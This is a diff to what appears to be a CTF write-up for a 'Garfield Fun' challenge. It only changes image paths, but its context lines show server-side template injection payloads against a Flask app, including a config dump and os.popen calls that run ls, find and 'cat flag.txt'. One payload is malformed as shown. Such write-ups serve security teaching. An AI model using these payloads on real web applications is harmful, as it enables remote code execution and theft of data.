@@ -90,12 +90,12 @@ media_subpath: /assets/img/_posts/garfield-ssti
 
 ### Confirming SSTI
  [The challenege website](https://garfield-fun.challenge.uscctf.org)
- ![Garfield Fun](/assets/Garfield_00.png)
- ![Garfield Fun1](/assets/Garfield_01.png)
+ ![Garfield Fun](Garfield_00.png)
+ ![Garfield Fun1](Garfield_01.png)
 
     Payload:/mylabs?word_5={{7*7}}
     
- ![SSTI_Confirmed](/assets/Garfield_1.png)
+ ![SSTI_Confirmed](Garfield_1.png)
  
     Output: Observe the 49 in the image above.
     This confirms that SSTI exists.
@@ -104,7 +104,7 @@ media_subpath: /assets/img/_posts/garfield-ssti
 ### Exploring the Environment
     Payload:/mylabs?word_5={{config}}
     
- ![Config output](/assets/Garfield_2.png)
+ ![Config output](Garfield_2.png)
  
     This showed the Flask config object, but SECRET_KEY was None, so it was not useful.
 
@@ -114,7 +114,7 @@ media_subpath: /assets/img/_posts/garfield-ssti
 
     Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen('ls -la').read()}}
     
- ![ls output](/assets/Garfield_3.png)
+ ![ls output](Garfield_3.png)
 
  ---
 
@@ -122,7 +122,7 @@ media_subpath: /assets/img/_posts/garfield-ssti
 
     Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen(find.-maxdepth-type).read()}}
 
- ![find output](/assets/Garfield_4.png)
+ ![find output](Garfield_4.png)
 
     This revealed the presence of flag.txt.
 
@@ -131,7 +131,7 @@ media_subpath: /assets/img/_posts/garfield-ssti
 ### Reading the Flag
     Payload:/mylabs?word_5={{cycler.__init__.__globals__.os.popen('cat flag.txt').read()}}
  
- ![flag output](/assets/Garfield_5.png)
+ ![flag output](Garfield_5.png)
 
  ---
 
